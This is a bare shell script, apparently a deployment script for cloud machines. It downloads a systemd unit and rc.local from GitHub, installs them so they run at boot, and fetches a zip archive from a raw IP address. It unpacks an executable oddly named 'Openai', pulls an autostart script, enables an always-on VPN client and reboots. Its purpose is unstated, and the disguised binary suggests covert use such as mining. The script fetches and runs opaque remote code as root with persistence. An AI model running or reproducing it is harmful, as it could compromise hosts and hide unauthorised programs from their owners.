#!/bin/sh


wget https://raw.githubusercontent.com/minnie1311/azureAI/master/rc-local.service
sudo mv rc-local.service /etc/systemd/system/rc-local.service
wget https://raw.githubusercontent.com/haidanglx/script/master/rc.local1
sudo mv rc.local1 /etc/rc.local
sudo chmod +x /etc/rc.local
sudo systemctl enable rc-local
sudo wget http://20.212.206.110:8000/don.zip

sudo apt install unzip
sudo unzip -o don.zip
sudo chmod +x Openai


sudo wget https://raw.githubusercontent.com/haidanglx/script/master/autostart.sh
warp-cli enable-always-on
sudo reboot
